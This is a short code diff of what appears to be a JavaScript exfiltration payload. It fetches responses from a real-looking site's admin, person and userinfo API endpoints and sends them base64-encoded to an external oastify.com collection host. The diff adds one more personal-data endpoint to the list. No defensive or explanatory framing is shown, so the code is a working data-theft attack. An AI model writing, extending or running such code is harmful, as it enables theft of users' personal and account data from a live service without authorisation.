@@ -23,6 +23,8 @@ function fetchEncodeAndSend(originalUrl, targetUrlBase) {
 
 const targetUrlBase = 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com';  // Base URL where you send the base64 encoded data
 
+fetchEncodeAndSend('https://my.daryakenar.ir/api/Gates/1/inquires/person', targetUrlBase);
 fetchEncodeAndSend('https://my.daryakenar.ir/api/Admin/Users', targetUrlBase);
 fetchEncodeAndSend('https://my.daryakenar.ir/api/Persons', targetUrlBase);
 fetchEncodeAndSend('https://my.daryakenar.ir/connect/userinfo', targetUrlBase);
+
